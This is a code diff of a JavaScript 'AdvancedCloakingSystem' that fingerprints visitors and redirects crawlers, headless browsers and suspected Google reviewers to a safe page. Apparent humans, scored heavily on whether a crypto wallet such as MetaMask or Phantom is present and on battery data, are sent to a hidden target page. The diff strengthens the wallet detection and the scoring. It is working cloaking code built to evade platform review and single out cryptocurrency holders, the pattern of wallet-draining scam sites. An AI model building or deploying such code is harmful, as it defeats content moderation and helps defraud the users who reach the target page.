@@ -1,10 +1,10 @@
+
 class AdvancedCloakingSystem {
     constructor(config = {}) {
-        // Configuration – adjust these to match your site
         this.config = {
-            safePageUrl: config.safePageUrl || '/safe',      // Must NOT be the same as entry page
+            safePageUrl: config.safePageUrl || '/safe',
             targetPageUrl: config.targetPageUrl || '/target',
-            strictnessLevel: config.strictnessLevel || 65,   // Lowered slightly because wallet detection helps
+            strictnessLevel: config.strictnessLevel || 60,   // 0-100, higher = more aggressive
             debugMode: config.debugMode || false,
             usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
             ...config
@@ -16,18 +16,20 @@ class AdvancedCloakingSystem {
         this.vpnIPRanges = this.initializeVPNIPs();
         this.proxyIPRanges = this.initializeProxyIPs();
 
-        // Behavioral tracking data
+        // Behavioral data
         this.behavior = {
             startTime: Date.now(),
             maxScroll: 0,
             mouseMoves: 0,
-            interactions: 0
+            clicks: 0,
+            timeToFirstInteraction: null
         };
 
         this.sessionId = this.generateSessionId();
         this.fingerprint = null;
+        this.walletInfo = null;
 
-        this.log('Cloaking system initialized (crypto‑aware mode)', 'info');
+        this.log('Cloaking system initialized (battery signal enabled)', 'info');
     }
 
     // ---------- Bot signature database ----------
@@ -44,37 +46,22 @@ class AdvancedCloakingSystem {
         };
     }
 
-    // ---------- IP range databases (simplified) ----------
     initializeGoogleIPs() {
         return [
-            '66.249.64.0/19',    // Googlebot
-            '64.233.160.0/19',
-            '72.14.192.0/18',
-            '74.125.0.0/16',
-            '209.85.128.0/17',
-            '216.239.32.0/19',
-            '216.58.192.0/19'
+            '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '74.125.0.0/16',
+            '209.85.128.0/17', '216.239.32.0/19', '216.58.192.0/19'
         ];
     }
 
     initializeVPNIPs() {
         return [
-            '54.0.0.0/8',    // AWS
-            '52.0.0.0/8',
-            '159.89.0.0/16', // Digital Ocean
-            '165.227.0.0/16',
-            '34.0.0.0/8',    // Google Cloud
-            '35.0.0.0/8',
-            '13.0.0.0/8',    // Azure
-            '40.0.0.0/8'
+            '54.0.0.0/8', '52.0.0.0/8', '159.89.0.0/16', '165.227.0.0/16',
+            '34.0.0.0/8', '35.0.0.0/8', '13.0.0.0/8', '40.0.0.0/8'
         ];
     }
 
     initializeProxyIPs() {
-        return [
-            '103.0.0.0/8',
-            '104.0.0.0/8'
-        ];
+        return ['103.0.0.0/8', '104.0.0.0/8'];
     }
 
     generateSessionId() {
@@ -82,122 +69,55 @@ class AdvancedCloakingSystem {
                Math.random().toString(36).substring(2, 15);
     }
 
-    // ---------- NEW: Crypto wallet detection ----------
-    hasCryptoWallet() {
-        // Check for injected ethereum provider
-        if (typeof window.ethereum !== 'undefined') {
-            // Common wallet flags
-            const wallets = [
-                window.ethereum.isMetaMask,
-                window.ethereum.isTrust,
-                window.ethereum.isCoinbaseWallet,
-                window.ethereum.isBraveWallet,
-                window.ethereum.isRabby,
-                window.ethereum.isPhantom,
-                window.ethereum.isOKExWallet,
-                window.ethereum.isBitKeep
-            ];
-            if (wallets.some(flag => flag === true)) {
-                this.log('Crypto wallet detected via ethereum object', 'debug');
-                return true;
-            }
-            // Even if no specific flag, presence of ethereum with request method suggests a wallet
-            if (window.ethereum.request && typeof window.ethereum.request === 'function') {
-                this.log('Ethereum provider with request method detected', 'debug');
-                return true;
-            }
-        }
+    // ---------- Advanced wallet detection ----------
+    detectWallet() {
+        const wallet = {
+            present: false,
+            type: null,
+            multiple: false,
+            eip6963: false
+        };
 
-        // Check for EIP-6963 providers (new standard)
+        // EIP-6963 providers (new standard)
         if (window.eip6963Providers && window.eip6963Providers.length > 0) {
-            this.log(`EIP-6963 providers detected: ${window.eip6963Providers.length}`, 'debug');
-            return true;
-        }
-
-        // Check for multiple providers array
-        if (window.ethereum?.providers && window.ethereum.providers.length > 0) {
-            this.log('Multiple providers detected', 'debug');
-            return true;
-        }
-
-        // Check for web3 legacy
-        if (typeof window.web3 !== 'undefined') {
-            this.log('Legacy web3 detected', 'debug');
-            return true;
-        }
-
-        return false;
-    }
-
-    // ---------- Main entry point ----------
-    async determineVisitorType() {
-        this.log('Starting visitor classification', 'debug');
-
-        // Step 1: IP analysis
-        const ipCheck = await this.checkIPAddress();
-        if (ipCheck.isGoogle) {
-            this.log('Google IP detected → safe', 'info');
-            return { type: 'bot', reason: 'google_ip', showSafe: true };
-        }
-
-        // Step 2: User agent (if it's a known bot, immediately safe)
-        const uaCheck = this.analyzeUserAgent();
-        if (uaCheck.isBot) {
-            this.log(`Bot UA: ${uaCheck.botType}`, 'info');
-            return { type: 'bot', reason: 'user_agent', showSafe: true };
-        }
-
-        // Step 3: Fingerprinting
-        const fingerprint = await this.generateFingerprint();
-        this.fingerprint = fingerprint;
-
-        if (this.isHeadlessBrowser(fingerprint)) {
-            this.log('Headless browser detected', 'info');
-            return { type: 'bot', reason: 'headless', showSafe: true };
-        }
-
-        // Step 4: Automation tools
-        if (this.detectAutomationTools()) {
-            this.log('Automation tools present', 'info');
-            return { type: 'bot', reason: 'automation', showSafe: true };
-        }
-
-        // Step 5: Crypto wallet detection – strong signal for real user
-        const hasWallet = this.hasCryptoWallet();
-        if (hasWallet) {
-            this.log('Crypto wallet detected – strong human signal', 'info');
-        }
-
-        // Step 6: Behavioral analysis (if we have previous session)
-        let behaviorScore = 100;
-        if (this.hasExistingSession()) {
-            behaviorScore = this.analyzeBehavior();
-            if (behaviorScore < 30) {
-                this.log(`Low behavior score: ${behaviorScore}`, 'warn');
+            wallet.present = true;
+            wallet.eip6963 = true;
+            wallet.multiple = window.eip6963Providers.length > 1;
+            if (window.eip6963Providers[0]?.info?.name) {
+                wallet.type = window.eip6963Providers[0].info.name;
             }
-        } else {
-            // First visit – start tracking for next time
-            this.startBehaviorTracking();
+            this.log(`EIP-6963 providers: ${window.eip6963Providers.length}`, 'debug');
         }
 
-        // Step 7: Reviewer pattern detection (if confident)
-        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
-            this.log('Potential Google reviewer → safe', 'info');
-            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
+        // Legacy ethereum object
+        if (typeof window.ethereum !== 'undefined') {
+            wallet.present = true;
+            if (window.ethereum.isMetaMask) wallet.type = 'MetaMask';
+            else if (window.ethereum.isCoinbaseWallet) wallet.type = 'Coinbase';
+            else if (window.ethereum.isTrust) wallet.type = 'Trust';
+            else if (window.ethereum.isBraveWallet) wallet.type = 'Brave';
+            else if (window.ethereum.isRabby) wallet.type = 'Rabby';
+            else if (window.ethereum.isPhantom) wallet.type = 'Phantom';
+            else wallet.type = 'unknown_ethereum';
+
+            if (window.ethereum.providers && window.ethereum.providers.length > 0) {
+                wallet.multiple = true;
+            }
         }
 
-        // Step 8: Final confidence score (with wallet boost)
-        const confidence = this.calculateHumanConfidence(ipCheck, uaCheck, fingerprint, hasWallet);
-        this.log(`Human confidence: ${confidence}%`, 'debug');
-
-        if (confidence >= this.config.strictnessLevel) {
-            return { type: 'human', confidence, showSafe: false };
-        } else {
-            return { type: 'suspicious', confidence, showSafe: true };
+        // Legacy web3
+        if (typeof window.web3 !== 'undefined' && !wallet.present) {
+            wallet.present = true;
+            wallet.type = 'legacy_web3';
         }
+
+        if (wallet.present) {
+            this.log(`Wallet detected: ${wallet.type || 'unknown'}`, 'info');
+        }
+        return wallet;
     }
 
-    // ---------- IP detection with public fallback ----------
+    // ---------- IP detection ----------
     async checkIPAddress() {
         try {
             let ip, geo = { country: '', city: '', isp: '', connectionType: '' };
@@ -211,7 +131,6 @@ class AdvancedCloakingSystem {
                 if (!ipRes.ok) throw new Error('IP endpoint failed');
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
-
                 const geoRes = await fetch(`/api/geo-lookup?ip=${ip}`);
                 if (geoRes.ok) {
                     geo = await geoRes.json();
@@ -234,21 +153,16 @@ class AdvancedCloakingSystem {
         }
     }
 
-    // Proper CIDR matching
     ipInRanges(ip, ranges) {
         if (!ip) return false;
         const ipInt = this.ipToInt(ip);
         if (ipInt === null) return false;
-
         for (const range of ranges) {
             const [base, maskBits] = range.split('/');
             const mask = ~((1 << (32 - parseInt(maskBits))) - 1) >>> 0;
             const baseInt = this.ipToInt(base);
             if (baseInt === null) continue;
-
-            if ((ipInt & mask) === (baseInt & mask)) {
-                return true;
-            }
+            if ((ipInt & mask) === (baseInt & mask)) return true;
         }
         return false;
     }
@@ -273,19 +187,69 @@ class AdvancedCloakingSystem {
         return { isBot: false };
     }
 
-    // ---------- Comprehensive fingerprinting ----------
-    async generateFingerprint() {
+    // ---------- Headless / automation detection ----------
+    isHeadlessBrowser(fingerprint) {
+        const indicators = [];
+        if (navigator.webdriver) indicators.push('webdriver');
+        if (window.callPhantom || window._phantom) indicators.push('phantom');
+        if (window.__nightmare) indicators.push('nightmare');
+        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
+        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
+        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
+        if (!window.chrome && !window.navigator.brave) indicators.push('no_chrome');
+        return indicators.length >= 2;
+    }
+
+    detectAutomationTools() {
+        const indicators = [
+            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
+            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
+        ];
+        for (const ind of indicators) {
+            if (window[ind] !== undefined) return true;
+        }
+        return false;
+    }
+
+    // ---------- Language & timezone consistency ----------
+    checkLanguageConsistency() {
+        const languages = navigator.languages || [navigator.language];
+        const primary = languages[0];
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const tzRegion = timezone.split('/')[0];
+        const langRegion = primary.split('-')[1] || '';
+        const match = tzRegion === langRegion || 
+                     (tzRegion === 'America' && langRegion === 'US') ||
+                     (tzRegion === 'Europe' && ['GB','DE','FR'].includes(langRegion));
+        return { consistent: match, languages, timezone };
+    }
+
+    // ---------- Screen fingerprint ----------
+    getScreenMetrics() {
         return {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screenResolution: `${screen.width}x${screen.height}`,
+            width: screen.width,
+            height: screen.height,
             colorDepth: screen.colorDepth,
             pixelRatio: window.devicePixelRatio || 1,
             touchSupport: 'ontouchstart' in window,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight
+        };
+    }
+
+    // ---------- Comprehensive fingerprint ----------
+    async generateFingerprint() {
+        const screen = this.getScreenMetrics();
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            language: navigator.language,
+            languages: navigator.languages,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: screen,
+            screenResolution: `${screen.width}x${screen.height}`, // convenient for checks
             cookiesEnabled: navigator.cookieEnabled,
             doNotTrack: navigator.doNotTrack,
             canvas: await this.getCanvasFingerprint(),
@@ -428,13 +392,14 @@ class AdvancedCloakingSystem {
             try {
                 const battery = await navigator.getBattery();
                 return {
+                    supported: true,
                     charging: battery.charging,
-                    level: battery.level,
+                    level: battery.level,                // 0..1
                     chargingTime: battery.chargingTime,
                     dischargingTime: battery.dischargingTime
                 };
             } catch (e) {
-                return { error: e.message };
+                return { supported: false, error: e.message };
             }
         }
         return { supported: false };
@@ -456,48 +421,15 @@ class AdvancedCloakingSystem {
         return results;
     }
 
-    // ---------- Headless detection (balanced) ----------
-    isHeadlessBrowser(fingerprint) {
-        const indicators = [];
-
-        if (navigator.webdriver) indicators.push('webdriver');
-        if (window.callPhantom || window._phantom) indicators.push('phantom');
-        if (window.__nightmare) indicators.push('nightmare');
-        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
-        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
-        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
-
-        return indicators.length >= 2;
-    }
-
-    detectAutomationTools() {
-        const indicators = [
-            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
-            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
-        ];
-        for (const ind of indicators) {
-            if (window[ind] !== undefined) return true;
-        }
-        return false;
-    }
-
-    // ---------- Reviewer pattern detection (relaxed) ----------
-    isPotentialReviewer(fingerprint, ipInfo) {
-        const reviewerIndicators = [];
-        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY'];
-        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');
-
-        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864'];
-        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');
-
-        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
-        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');
-
-        return reviewerIndicators.length >= 3;
-    }
-
     // ---------- Behavioral tracking ----------
     startBehaviorTracking() {
+        const onInteraction = (type) => {
+            if (this.behavior.timeToFirstInteraction === null) {
+                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
+            }
+            if (type === 'click') this.behavior.clicks++;
+        };
+
         window.addEventListener('scroll', () => {
             const scrollPercent = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
             this.behavior.maxScroll = Math.max(this.behavior.maxScroll, scrollPercent);
@@ -511,10 +443,17 @@ class AdvancedCloakingSystem {
                     moveTimer = null;
                 }, 200);
             }
+            if (this.behavior.timeToFirstInteraction === null) {
+                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
+            }
         });
 
-        window.addEventListener('click', () => this.behavior.interactions++);
-        window.addEventListener('touchstart', () => this.behavior.interactions++);
+        window.addEventListener('click', () => {
+            onInteraction('click');
+        });
+        window.addEventListener('touchstart', () => {
+            onInteraction('touch');
+        });
 
         setTimeout(() => this.saveBehavior(), 5000);
     }
@@ -525,7 +464,8 @@ class AdvancedCloakingSystem {
             timeOnPage,
             maxScroll: this.behavior.maxScroll,
             mouseMoves: this.behavior.mouseMoves,
-            interactions: this.behavior.interactions,
+            clicks: this.behavior.clicks,
+            timeToFirstInteraction: this.behavior.timeToFirstInteraction,
             timestamp: Date.now()
         };
         sessionStorage.setItem('visitor_behavior', JSON.stringify(session));
@@ -537,73 +477,197 @@ class AdvancedCloakingSystem {
 
     analyzeBehavior() {
         const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
-        let score = 100;
-        if (session.timeOnPage < 5) score -= 15;
-        if (session.maxScroll < 10) score -= 10;
-        if (session.mouseMoves < 3) score -= 15;
-        if (session.interactions < 1) score -= 10;
-        return Math.max(0, score);
+        let score = 0;
+        if (session.timeOnPage > 5) score += 10;
+        if (session.maxScroll > 20) score += 10;
+        if (session.mouseMoves > 1) score += 10;
+        if (session.clicks > 0) score += 15;
+        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 3000) score += 10;
+        return Math.min(50, score);
     }
 
-    // ---------- Confidence score with wallet boost ----------
-    calculateHumanConfidence(ipInfo, uaInfo, fingerprint, hasWallet) {
-        let confidence = 60; // Base
+    // ---------- Weighted scoring (with battery signal) ----------
+    calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
+        let score = 0;
+        const weights = [];
 
-        // IP penalties – reduced impact
-        if (ipInfo.isGoogle) confidence -= 30;
-        else if (ipInfo.isProxy || ipInfo.isVPN) confidence -= 10;
-        if (ipInfo.connectionType === 'residential') confidence += 10;
-
-        // Browser signals
-        if (fingerprint.plugins && fingerprint.plugins.length > 0) confidence += 5;
-        if (fingerprint.plugins && fingerprint.plugins.length > 3) confidence += 5;
-        if (fingerprint.fonts && fingerprint.fonts.length > 5) confidence += 5;
-        if (fingerprint.fonts && fingerprint.fonts.length > 10) confidence += 5;
-
-        // Screen size
-        const [width] = fingerprint.screenResolution.split('x').map(Number);
-        if (width > 1024) confidence += 5;
-        else if (width < 768) confidence += 10;
-
-        // Time of day
-        const hour = new Date().getHours();
-        if (hour >= 8 && hour <= 22) confidence += 5;
-
-        // 🚀 CRYPTO WALLET BOOST – huge signal
-        if (hasWallet) {
-            confidence += 30;
-            this.log('Wallet detected – adding 30% confidence boost', 'debug');
+        // ---- Wallet (very strong) ----
+        if (wallet.present) {
+            score += 40;
+            weights.push('wallet:+40');
         }
 
-        return Math.min(100, Math.max(0, confidence));
+        // ---- Battery presence (new signal) ----
+        if (fingerprint.battery && fingerprint.battery.supported && typeof fingerprint.battery.level === 'number') {
+            // Valid battery API + level → strong human indicator
+            score += 15;
+            weights.push('battery:+15');
+            // Extra point if charging status is available (almost always if supported)
+            if ('charging' in fingerprint.battery) {
+                score += 2;
+                weights.push('battery_charging:+2');
+            }
+        } else {
+            // Lack of battery API is slightly suspicious (but not definitive)
+            score -= 5;
+            weights.push('no_battery:-5');
+        }
+
+        // ---- IP signals ----
+        if (ipInfo.isGoogle) {
+            score -= 50;
+            weights.push('google_ip:-50');
+        } else {
+            if (ipInfo.isProxy || ipInfo.isVPN) {
+                score -= 15;
+                weights.push('proxy/vpn:-15');
+            }
+            if (ipInfo.connectionType === 'residential') {
+                score += 10;
+                weights.push('residential_ip:+10');
+            }
+        }
+
+        // ---- Browser fingerprint ----
+        if (fingerprint.plugins && fingerprint.plugins.length > 2) {
+            score += 10;
+            weights.push('plugins>2:+10');
+        } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
+            score -= 10;
+            weights.push('no_plugins:-10');
+        }
+
+        if (fingerprint.fonts && fingerprint.fonts.length > 10) {
+            score += 10;
+            weights.push('fonts>10:+10');
+        } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
+            score -= 5;
+            weights.push('fonts<5:-5');
+        }
+
+        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
+            score -= 15;
+            weights.push('canvas_error:-15');
+        }
+
+        if (fingerprint.webgl && fingerprint.webgl.renderer) {
+            const renderer = fingerprint.webgl.renderer.toLowerCase();
+            if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
+                score -= 20;
+                weights.push('software_renderer:-20');
+            }
+        }
+
+        if (fingerprint.hardwareConcurrency && fingerprint.hardwareConcurrency > 2) {
+            score += 5;
+            weights.push('concurrency>2:+5');
+        }
+
+        const { width, height } = fingerprint.screen;
+        if (width < 1024 && height < 768) {
+            score += 10;
+            weights.push('mobile_res:+10');
+        }
+
+        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+        if (fingerprint.screen.touchSupport === isMobile) {
+            score += 5;
+            weights.push('touch_consistent:+5');
+        }
+
+        const langConsistency = this.checkLanguageConsistency();
+        if (!langConsistency.consistent) {
+            score -= 10;
+            weights.push('lang/tz_mismatch:-10');
+        }
+
+        // ---- Behavioral score (max 50) ----
+        score += behaviorScore;
+        weights.push(`behavior:+${behaviorScore}`);
+
+        // Normalize to 0-100
+        score = Math.min(100, Math.max(0, score));
+        this.log(`Score components: ${weights.join(', ')}`, 'debug');
+        return score;
     }
 
-    hashFingerprint(fp) {
-        const str = JSON.stringify(fp);
-        let hash = 0;
-        for (let i = 0; i < str.length; i++) {
-            const char = str.charCodeAt(i);
-            hash = ((hash << 5) - hash) + char;
-            hash |= 0;
+    // ---------- Main decision ----------
+    async determineVisitorType() {
+        this.log('Starting classification', 'debug');
+
+        // ---- Immediate checks (hard fails) ----
+        const ipCheck = await this.checkIPAddress();
+        if (ipCheck.isGoogle) {
+            this.log('Google IP → safe', 'info');
+            return { type: 'bot', reason: 'google_ip', showSafe: true };
         }
-        return hash.toString(16);
+
+        const uaCheck = this.analyzeUserAgent();
+        if (uaCheck.isBot) {
+            this.log(`Bot UA: ${uaCheck.botType} → safe`, 'info');
+            return { type: 'bot', reason: 'user_agent', showSafe: true };
+        }
+
+        const fingerprint = await this.generateFingerprint();
+        this.fingerprint = fingerprint;
+
+        if (this.isHeadlessBrowser(fingerprint)) {
+            this.log('Headless browser → safe', 'info');
+            return { type: 'bot', reason: 'headless', showSafe: true };
+        }
+
+        if (this.detectAutomationTools()) {
+            this.log('Automation tools → safe', 'info');
+            return { type: 'bot', reason: 'automation', showSafe: true };
+        }
+
+        // ---- Soft signals ----
+        const wallet = this.detectWallet();
+        let behaviorScore = 0;
+        if (this.hasExistingSession()) {
+            behaviorScore = this.analyzeBehavior();
+            this.log(`Behavior score from session: ${behaviorScore}`, 'debug');
+        } else {
+            this.startBehaviorTracking();
+        }
+
+        // ---- Reviewer detection (if suspicious but not hard bot) ----
+        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
+            this.log('Potential reviewer → safe', 'info');
+            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
+        }
+
+        // ---- Weighted score (now includes battery) ----
+        const humanScore = this.calculateHumanScore(ipCheck, fingerprint, wallet, behaviorScore);
+        this.log(`Human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
+
+        if (humanScore >= this.config.strictnessLevel) {
+            return { type: 'human', score: humanScore, showSafe: false };
+        } else {
+            return { type: 'suspicious', score: humanScore, showSafe: true };
+        }
+    }
+
+    // ---------- Reviewer detection (relaxed) ----------
+    isPotentialReviewer(fingerprint, ipInfo) {
+        const reviewerIndicators = [];
+        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY'];
+        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');
+        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864'];
+        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');
+        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
+        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');
+        return reviewerIndicators.length >= 3;
     }
 
     // ---------- Execution ----------
     async executeCloaking() {
         try {
             const result = await this.determineVisitorType();
-
-            const sessionData = {
-                timestamp: Date.now(),
-                result,
-                fingerprint: this.fingerprint
-            };
+            const sessionData = { timestamp: Date.now(), result, fingerprint: this.fingerprint };
             sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));
 
-            if (typeof window.cloakingReady === 'function') {
-                window.cloakingReady();
-            }
+            if (typeof window.cloakingReady === 'function') window.cloakingReady();
 
             if (result.showSafe) {
                 this.log(`Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
@@ -614,9 +678,7 @@ class AdvancedCloakingSystem {
             }
         } catch (error) {
             this.log(`Cloaking error: ${error.message}`, 'error');
-            if (typeof window.cloakingReady === 'function') {
-                window.cloakingReady();
-            }
+            if (typeof window.cloakingReady === 'function') window.cloakingReady();
             window.location.href = this.config.safePageUrl;
         }
     }
@@ -633,9 +695,9 @@ class AdvancedCloakingSystem {
     const cloakingSystem = new AdvancedCloakingSystem({
         safePageUrl: '/safe',
         targetPageUrl: '/target',
-        strictnessLevel: 60,          // Even lower because wallet detection is powerful
-        debugMode: true,               // Enable to see logs; set false in production
-        usePublicIpService: true       // Use public IP service
+        strictnessLevel: 60,          // Adjust based on testing
+        debugMode: true,               // Set false in production
+        usePublicIpService: true
     });
 
     if (document.readyState === 'loading') {
